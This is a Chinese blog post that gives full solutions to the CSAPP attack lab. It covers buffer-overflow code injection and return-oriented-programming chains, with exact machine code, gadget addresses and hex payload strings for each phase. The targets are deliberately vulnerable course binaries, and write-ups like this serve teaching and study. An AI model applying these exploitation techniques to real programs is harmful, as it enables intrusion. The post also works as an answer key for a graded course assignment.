<!DOCTYPE html>
<html prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# " lang="en">
<head>
<meta charset="utf-8">
<meta name="description" content="CSAPP attacklab 解法及思路记录">
<meta name="viewport" content="width=device-width">
<title>CSAPP-attacklab 解题思路记录 | Procrastination Prescription</title>
<link href="../../assets/css/all-nocdn.css" rel="stylesheet" type="text/css">
<link rel="alternate" type="application/rss+xml" title="RSS" href="../../rss.xml">
<link rel="canonical" href="https://zero4drift.github.io/posts/csapp-attacklab-jie-ti-si-lu-ji-lu/">
<!--[if lt IE 9]><script src="../../assets/js/html5.js"></script><![endif]-->
</head>
<body>
<div class="container" id="container">
    <!--Body content-->
    <!--End of body content-->
    <div>
    <a href="https://zero4drift.github.io/"><h1>Procrastination Prescription</h1></a>
    </div>
    <div id="content">
        
        
    <div class="postdiv">
    <a href="."><h2>CSAPP-attacklab 解题思路记录</h2></a>
    <div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">准备</h2>
<div class="outline-text-2" id="text-1">
<ol class="org-ol">
<li>
<a href="http://www.baidu.com/link?url=Yp2_MbsZGzDA3r8TVeySxRoTigACMN3YVMUcJKVK_k4enAAayCJAyqsNra_ONMPZ&amp;wd=&amp;eqid=f22ab52e00016e08000000065a772b7a">官方 lab 主页</a> lab 的指导文档是必须看的，少走很多弯路；
</li>
<li>在 CSAPP Lab Assginments 官网上包含二进制可执行文件的压缩包不能在 Windows 平
台下解压缩，否则在 Linux 平台上运行时会出现权限问题（当然，也可以用 <code>chmod
   777 xxx</code> 解决，不过没必要）；
</li>
<li>
<code>./ctarget</code> 这样的命令会出现 <i>illegal host…</i> 错误，后面加个 <code>-q</code> 命令就好了，不让程序发送结果
到评分服务器；
</li>
<li>自带的 HEX2RAW 程序会将16进制数据转换为字符串，输入的16进制数据格式必须是两位
16进制数，之间用空格隔开；
</li>
<li>机器内二进制数据表示都是小端法；
</li>
<li>阅读官网页面上此 lab 的 pdf 格式的指导文件，其中详细记录每一个破解操作的要求。
</li>
</ol>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">破解</h2>
<div class="outline-text-2" id="text-2">
<blockquote>
<p>
Now attack!
</p>
</blockquote>

<p>
共有5个破解任务：
</p>
<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
<colgroup>
<col class="right">
<col class="left">
<col class="right">
<col class="left">
<col class="left">
<col class="right">
</colgroup>
<tbody>
<tr>
<td class="right">Phase</td>
<td class="left">Program</td>
<td class="right">Level</td>
<td class="left">Method</td>
<td class="left">Function</td>
<td class="right">Points</td>
</tr>
<tr>
<td class="right">1</td>
<td class="left">CTARGET</td>
<td class="right">1</td>
<td class="left">CI</td>
<td class="left">touch1</td>
<td class="right">10</td>
</tr>
<tr>
<td class="right">2</td>
<td class="left">CTARGET</td>
<td class="right">2</td>
<td class="left">CI</td>
<td class="left">touch2</td>
<td class="right">25</td>
</tr>
<tr>
<td class="right">3</td>
<td class="left">CTARGET</td>
<td class="right">3</td>
<td class="left">CI</td>
<td class="left">touch3</td>
<td class="right">25</td>
</tr>
<tr>
<td class="right">4</td>
<td class="left">RTARGET</td>
<td class="right">2</td>
<td class="left">ROP</td>
<td class="left">touch2</td>
<td class="right">35</td>
</tr>
<tr>
<td class="right">5</td>
<td class="left">RTARGET</td>
<td class="right">3</td>
<td class="left">ROP</td>
<td class="left">touch3</td>
<td class="right">5</td>
</tr>
</tbody>
</table>
<ol class="org-ol">
<li>CI（代码注入）方式来破解的 Ctarget 可执行文件运行栈位置是不变的；
</li>
<li>ROP（返回导向）方式来破解的 Rtarget 这个可执行代码文件的运行时栈位置每次运行
都不同的；而且它在栈中的代码是不可执行的，否则会引起 Segmentation Fault，所以
不能用代码注入的方式来破解；
</li>
</ol>
<!-- TEASER_END -->
</div>

<div id="outline-container-sec-2-1" class="outline-3">
<h3 id="sec-2-1">phase_1</h3>
<div class="outline-text-3" id="text-2-1">
<ol class="org-ol">
<li>要求在 Ctarget 执行时在 test 函数执行完成 <code>val = getbuf()</code> 完成后转移到
touch1 函数执行而不是打印，几个函数的源代码：
<div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="nf">getbuf</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>  <span class="cm">/* BUFFER_SIZE 是一个常量 */</span>
  <span class="n">Gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>  <span class="cm">/* 破解的切入点 */</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">test</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
  <span class="n">val</span> <span class="o">=</span> <span class="n">getbuf</span><span class="p">();</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"No exploit. Getbuf returned 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">touch1</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Touch1!: You called touch1()</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">validate</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</li>

<li>切入点是 getbuf 函数，它调用的 Gets 函数与C库函数 gets 功能类似，但引入了一个
漏洞。它为 buf 这个变量在栈中分配了空间，如果输入的字符串长度超过 BUFFER_SIZE
指定的长度，Gets 就会将多的字符数据覆盖到不属于这个 buf 变量的栈空间中（试试看
<code>./ ctarget 一个超长字符串</code> ，会报 Segment Fault）；
</li>
<li>在调用函数前，会将调用结束后的下一个指令的地址存放于栈中 <code>push %rip</code> ，当调用
函数返回时，就会从栈中取回地址并继续运行；
</li>
<li>所以我们需要找办法用 touch1 首地址覆盖掉第3步中提及的地址，在这里就是利用
Gets 函数的漏洞，将这个地址放置于输入的字符串中；
</li>
<li>首先确定 touch1 函数的虚拟地址：0x4017c0；
</li>
<li>查看 ctarget 反编译代码中 getbuf 为了创建这个字符数组 buf 占用了多少栈空间：
<pre class="example">
4017a8:	48 83 ec 28          	sub    $0x28,%rsp
4017ac:	48 89 e7             	mov    %rsp,%rdi
4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;
</pre>
<p>
占用了40个内存地址的空间，也就是说最多只能输入40个字符，而当前的栈底部+8的位
置就存储了此次调用结束后的返回地址；
</p>
</li>
<li>只需要将 0x4017c0 扩展成 0x004017c0，因为是64位系统，地址占据了8个地址的空间，
小端法所以输入时应该是 c0 17 40 00，前面还应该有40个字符，全填0就可以了；
</li>
<li>使用 HEX2RAW 将数据转换成字符串（最好是保存在文件中）， <code>./ctardgt -q -i file</code> 即可。
</li>
</ol>
</div>
</div>

<div id="outline-container-sec-2-2" class="outline-3">
<h3 id="sec-2-2">phase_2</h3>
<div class="outline-text-3" id="text-2-2">
<ol class="org-ol">
<li>要求在 test 函数中调用 getbuf 函数返回后，进入 touch2 函数调用，而不是原来的
打印一串字符，touch2 代码如下：
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">touch2</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Touch2!: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Misfire!: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
    <span class="n">fail</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>
本题唯一和 phase_1 不同的地方在与，不仅需要代码注入从而跳到别的函数处执行，还
要在代码注入中为这个函数准备参数；不允许使用 jump 或者 call 指令；
</p>
</li>
<li>函数调用前，它的第一个参数是存放在 %rdi 中的，最多有6个整型或指针型参数通过寄
存器传送，操作数宽度是8字节时，寄存器使用顺序依次是 %rdi %rsi %rdx %rcx %r8
%r9；
</li>
<li>cookie 的值 lab 中已经给出：0x59b997fa；touch2 函数的首地址是：0x4017ec；
</li>
<li>要想实现题目要求的效果：
<ol class="org-ol">
<li>首先需要和 phase_1 一样替换 getbuf 调用后的返回地址，替换成什么呢？注意，
并不是替换成 touch2 函数的首地址，这样的话参数验证就不正确了；
</li>
<li>正确做法是把那个返回地址替换为 getbuf 中 %rsp 处的值，也就是 buf 变量存储
空间开始的地方；
</li>
<li>注入的代码应该放置在 buf 的存储位置处，这样 getbuf 调用完成后就会跳转到这
个位置并运行其中存储的机器码；
</li>
<li>使用 gdb 获得 getbuf 中 %rsp 寄存器的值，是 0x5561dc78
</li>
</ol>
</li>
<li>注入的代码功能是：将 cookie 的值传入 %edi 寄存器中，将 touch2 的代码推入栈中，
然后返回，这样就可以正确的参数调用 touch2，汇编代码就是：
<pre class="example">
mov $0x59b997fa,%rdi
pushq $0x4017ec
ret
</pre>
<p>
相应的机器码就是 bf fa 97 b9 59 68 ec 17 40 00 c3
</p>
</li>
<li>输入的最后应该是 78 dc 61 55，中间全部用00 填充。
</li>
</ol>
</div>
</div>

<div id="outline-container-sec-2-3" class="outline-3">
<h3 id="sec-2-3">phase_3</h3>
<div class="outline-text-3" id="text-2-3">
<ol class="org-ol">
<li>和 phase_2 类似，但是传递的参数不是 cookie 的值，中间跳转到的函数是 touch3，
传入给它的参数是一个特殊的字符串，代码：
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">hexmatch</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">cbuf</span><span class="p">[</span><span class="mi">110</span><span class="p">];</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">cbuf</span> <span class="o">+</span> <span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span>
  <span class="n">sprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"%.8x"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
  <span class="cm">/* 将无符号整数 val 的值按格式化字符串格式化，输出到 s 指向的字符串 */</span>
  <span class="k">return</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">sval</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
  <span class="cm">/* 比较 sval 和 s 指向的字符串的前9个字节 */</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">touch3</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">hexmatch</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sval</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Touch3!: You called touch3(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span> <span class="cm">/* 必须匹配 */</span>
    <span class="n">validate</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Misfire: You called touch3(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
    <span class="n">fail</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</li>

<li>注意：
<ul class="org-ul">
<li>在 getbuf 函数中通过 <code>sub 28,%rsp</code> 给 buf 变量分配存储空间，存储输入的
字符串；
</li>
<li>在 getbuf <b>退栈</b> 返回后调用 touch3 函数时，touch3 函数以及其内部调用
hexmatch 和 strncmp 又会使栈增长，特别是，hexmatch 函数内部为变量分配了 110
个地址空间，这个已经完全包括了原来 getbuf 中分配的40个地址空间了；
</li>
<li>而且因为 hexmatch 函数内部指向字符串的指针 s 的首地址是在这110个地址空间的
前99个地址中随机生成的，在地址 s 处写入数据有可能将 getbuf 中存储在其40个地
址空间的数据覆盖；
</li>
<li>sval 如果指向的是 getbuf 中分配的地址空间中的一个，它指向的数据被覆盖的话，
strncmp 就会引用不正确的内容；更不用提 strncmp 也可能会增长栈并覆写数据；
</li>
</ul>
</li>
<li>根据第2条，这一次注入的代码不应该在 getbuf 的40个存储空间中，它应该上探到
test 函数的栈空间中（或者再上探），毕竟在这一系列的调用中，test 没有退栈，而
且 touch3 退出时使用了 <code>exit(0)</code> ，test 的栈中数据被覆盖不会造成错误；
</li>
<li>确认 touch3 函数的首地址是：0x4018fa，cookie是：0x59b997fa，因为 hexmatch 中
是与它的字符串表示作比较，对应 ASCII 码转换成字符串"59b997fa"后的16进制表示是：
35 39 62 39 39 37 66 61 00（最后一个 \0 表示字符串结束，所以这里是9个字符，这
也是为什么 hexmatch 中要比较9个字节）
</li>
<li>注入的代码和 phase_2 中类似，只是注入的位置不同：
<pre class="example">
push $0x0  # 保险起见将字符串后一段数据位全设置为0（0x00 表示 \0）
movq $0x6166373939623935,%rax  # x86-64 中的 trick pushq 最大接受32位的立即数
pushq %rax  # 压栈
movq %rsp,%rdi  # 将字符串保存的首地址送 %rdi
pushq $0x4018fa
ret
</pre>
<p>
相应的机器码就是 6a 00 48 b8 35 39 62 39 39 37 66 61 50 48 89 e7 68 fa 18 40
00 c3
</p>
</li>
<li>跳转地址就不能在 getbuf 中栈增长后的 %rsp ~ %rsp+40 这个地址范围内了，为了方
便，注入代码就存储在紧靠存储返回地址的区域，既然是通过 pushq 指令压入数据并使
栈增长，指向这个字符串的指针就是 pushq 之后 $rsp 的值；
</li>
<li>输入的字符串的16进制表示就得是：前40个字节都是 00 ，a8 dc 61 55 后还应该加四
组00 ，因为这是一个64位地址，取返回地址时是64位一起取的，然后再加上转换得到的
机器码；
</li>
<li>最后是 00 00 … a8 dc 61 55 00 00 00 00 6a 00 48 b8 35 39 62 39 39 37 66 61
50 48 89 e7 68 fa 18 40 00 c3
</li>
</ol>
</div>
</div>

<div id="outline-container-sec-2-4" class="outline-3">
<h3 id="sec-2-4">phase_4</h3>
<div class="outline-text-3" id="text-2-4">
<ol class="org-ol">
<li>这里使用了 Return-Oriented 的方式，详细介绍及具体的破解要求、辅助说明见 lab
的指导文档；
</li>
<li>就如指导文件中所说的，这次破解只需要跳转两个 gadget：一个包含了 <code>popq %rax</code>
，一个包含了 <code>movq %rax,%rdi</code> ，它们的二进制表示分别是 <code>58</code> <code>48 89 c7</code> ，还有
<code>nop</code> 指令使程序计数器加1，二进制表示是 <code>90</code> ，还有 <code>ret</code> 返回指令，二进制表
示是 <code>c3</code> ；
</li>
<li>上面提到的两个 gadget 在反编译 rtarget 的汇编代码文件中是这样的：
<pre class="example">
00000000004019a7 &lt;addval_219&gt;:
4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
4019ad:	c3
...
00000000004019a0 &lt;addval_273&gt;:
4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
4019a6:	c3
</pre>
</li>
<li>实现的功能就是从 getbuf 返回后，进入 0x4019ab 处执行使 0x59b997fa 弹出栈保存
在 %rax 寄存器中，然后进入 0x4019a2 处执行，将 %rax 的内容送到 %rdi 寄存器处，
最后进入 %0x4017ec 处执行 touch2 的指令；
</li>
<li>所以最后的结果用16进制来表示就是 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab
19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40
00 00 00 00 00
</li>
</ol>
</div>
</div>

<div id="outline-container-sec-2-5" class="outline-3">
<h3 id="sec-2-5">phase_5</h3>
<div class="outline-text-3" id="text-2-5">
<ol class="org-ol">
<li>虽然本题只有5分，但据文档中所说，这道题是最难的，属于加分题，实在完成不了分数
损失也不大；
</li>
<li>由于要传递指针，这次在输入字符串中应该包含 cookie "0x59b997fa" 的
ASCII 表示，传递的参数就是这个字符串的首地址；
</li>
<li>思路大体来说是这样：
<ol class="org-ol">
<li>为了不影响栈内存储地址，将 cookie 字符串的数据放在输入最后；
</li>
<li>getbuf 返回后应当进入的函数（或者跳转几个函数）应该实现将 cookie 字符串的
首地址传送给 %edi
</li>
<li>最后进入 touch3 函数的指令块，地址是；0x4018fa；
</li>
</ol>
</li>
<li>具体实现：将 cookie 字符串首地址存放在 touch3 函数地址存储后，在调用 touch3
函数前计算获得 cookie 字符串的首地址，如何做：
<ol class="org-ol">
<li>计算偏移量，
<ol class="org-ol">
<li>在跳转到 touch3 前的最后几次跳转依次是
<ol class="org-ol">
<li>取得当前栈顶，将当前的 %rsp 送给 %rax（当前跳转地址已弹出）；
</li>
<li>将 %rax 送 %rdi；
</li>
<li>将 %rdi 与偏移量相加，结果存储在 %rax 中；
</li>
<li>将 $rax 送 %rdi;
</li>
</ol>
</li>
<li>上面提及的每次跳转地址都在栈中占据8个地址空间，连 touch3 的跳转地址包括
在内，偏移量应该是 <b>32</b>;
</li>
</ol>
</li>
<li>使用指令获得偏移量
<ol class="org-ol">
<li>getbuf 结束之后应该执行指令计算偏移量
</li>
<li>注意到 farm 里面有一个非常特别的函数，地址是 0x4019d6，实现了 <code>lea
         (%rdi,%rsi,1),%rax</code> ，在跳转到 touch3 前取得的 %rsp 寄存器中的值离
cookie 字符串的栈地址还有距离。现在必需通过多次重复加法来获得正确的字符
串首地址；
</li>
<li>通过“加一”这个关键词，搜索到 farm 中有一个直接给 %eax 传送1的函数，地址
是 0x4019d0；
</li>
<li>将 %eax 中的1送到 %edi 寄存器，机器码 <code>89 c7</code> ，地址是 0x4019c6；
</li>
<li>现在必须让 %eax 中的1送到 %esi 中，但是 farm 中没有直接实现这个功能的机
器码 <code>89 c6</code> ，只能绕几个弯来实现了：
<ol class="org-ol">
<li>无非是将 %eax 的值传送（movl）给别的寄存器，再送给 %esi，可能不止绕
一次；
</li>
<li>movl 的机器码表示是 <code>89</code> ，但是 farm 中的机器码这么多，不可能一个一
个找过去，这时候 lab 的指导文档提供的附录就非常有用了，其实它已经明
确指出了在这次 lab 中必然会用到 functional nop 指令，这些指令不会改
变操作符中寄存器的值；
</li>
<li>在 farm 中搜索这些 functional nop 的机器码，以及这些机器码前是否
<code>89</code> 这个 movl 机器码，可以找到三个有用的 gadget，分别实现了 <code>movl
            %eax,%edx</code>, <code>movl %edx,%ecx</code>, <code>movl %ecx,%esi</code>, 地址分别是：
0x401a42, 0x401a34, 0x401a27
</li>
<li>在跳转执行这三个地址的机器码之后，%esi 中的值就是1了（与movb、movw不
同，movl指令将会填充目的寄存器的低32位，并使高32位全部为0；所以，
%rsi中的值也是1）
</li>
</ol>
</li>
<li>每次跳转到第1步中说明的地址，完成运行之后必须再次将 %eax 的内容送 %edi
及 %esi，然后再次跳到第3步中说明的地址，反复多次直到 %esi 中的值就是32
为止；
</li>
<li>所以刚开始的跳转序列应该是：d0 19 40 00 00 00 00 00 c6 19 40 00 00 00
00 00 42 1a 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 27 1a 40 00 00 00
00 00 d6 19 40 00 00 00 00 00 c6 19 40 00 00 00 00 00 42 1a 40 00 00 00
00 00 34 1a 40 00 00 00 00 00 27 1a 40 00 00 00 00 00 d6 19 40 00 00 00
00 00 c6 19 40 00 00 00 00 00 42 1a 40 00 00 00 00 00 34 1a 40 00 00 00
00 00 27 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 c6 19 40 00 00 00
00 00 42 1a 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 27 1a 40 00 00 00
00 00 d6 19 40 00 00 00 00 00 c6 19 40 00 00 00 00 00 42 1a 40 00 00 00
00 00 34 1a 40 00 00 00 00 00 27 1a 40 00 00 00 00 00 d6 19 40 00 00 00
00 00 42 1a 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 27 1a 40 00 00 00
00 00
</li>
</ol>
</li>
<li>然后就像计算偏移量中所提及的，进行最后几次跳转，地址依次是：
<ol class="org-ol">
<li>0x401a06，取得当前栈顶，将当前的 %rsp 送给 %rax；
</li>
<li>0x4019c5，将 %rax 送 %rdi；
</li>
<li>0x4019d6，将 %rdi 与偏移量相加，结果存储在 %rax 中；
</li>
<li>0x4019c5，将 $rax 送 %rdi;
</li>
<li>0x4018fa，执行 touch3；
</li>
</ol>
</li>
<li>最后的结果的机器码表示就是：前面40组 00 ，中间是2.7中列出的那一大串，最后
就是 06 1a 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 d6 19 40 00 00 00 00
00 c5 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00，再然后是 cookie 字符串
的机器级表示。
</li>
</ol>
</li>
</ol>
</div>
</div>
</div>
    </div>
    <div class="postmeta">
    <small> § 
        <span class="dateline"><a href="." rel="bookmark"><time class="published dt-published" datetime="2018-02-03T14:32:41+08:00" itemprop="datePublished" title="Publication date">2018-02-03 14:32</time></a></span>
    </small>
        · 
        
    <a href="#disqus_thread" data-disqus-identifier="cache/posts/csapp-attacklab-jie-ti-si-lu-ji-lu.html">Comments</a>


         · csapp c attack
    </div>

        
        
        <div id="disqus_thread"></div>
        <script>
        var disqus_shortname ="https-zero4drift-github-io",
            disqus_url="https://zero4drift.github.io/posts/csapp-attacklab-jie-ti-si-lu-ji-lu/",
        disqus_title="CSAPP-attacklab \u89e3\u9898\u601d\u8def\u8bb0\u5f55",
        disqus_identifier="cache/posts/csapp-attacklab-jie-ti-si-lu-ji-lu.html",
        disqus_config = function () {
            this.language = "en";
        };
        (function() {
            var dsq = document.createElement('script'); dsq.async = true;
            dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
</noscript>
    <a href="https://disqus.com" class="dsq-brlink" rel="nofollow">Comments powered by <span class="logo-disqus">Disqus</span></a>



    </div>
    <div class="row-fluid">
        <div class="span6" style="text-align: right; border-right: 2px solid #ccc; padding-right: 20px;">
            <ul class="unstyled bottom">
<li>
<a href="../../archive.html">Archive</a>
                        </li>
<li>
<a href="https://github.com/zero4drift">Github</a>
                        </li>
<li>
<a href="../../categories/">Tags</a>
                        </li>
<li>
<a href="../../rss.xml">RSS feed</a>
                
            </li>
</ul>
</div>
        <div class="span6" style="margin-left: 20px;">
            <ul class="unstyled bottom">
<li>Shares: <div id="share"></div>
</li>
            </ul>
<div>
            
            </div>
        </div>
    </div>
    <hr>
<div class="footer">
    Contents © 2018         <a href="mailto:fang0052@e.ntu.edu.sg">zero4drift</a> - Powered by         <a href="https://getnikola.com" rel="nofollow">Nikola</a>         
    
    </div>
</div>
    
            <script src="../../assets/js/all-nocdn.js"></script><script type="text/javascript" src="../../assets/js/jquery.sharrre-1.3.4.min.js"></script><script type="text/javascript">
        jQuery("a.image-reference").colorbox({rel:"gal",maxWidth:"80%",maxHeight:"80%",scalePhotos:true});
        $('#share').sharrre({
        share: {
            googlePlus: true,
            twitter: true
        },
        buttons: {
            googlePlus: {annotation:'bubble'},
            twitter: {count: 'horizontal'}
        },
        hover: function(api, options){
            $(api.element).find('.buttons').show();
        },
        hide: function(api, options){
            $(api.element).find('.buttons').hide();
        },
        enableTracking: true,
        urlCurl: ""
        });
    </script><!-- Global site tag (gtag.js) - Google Analytics --><script async src="https://www.googletagmanager.com/gtag/js?id=UA-112733609-1"></script><script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-112733609-1');
</script>
</body>
</html>
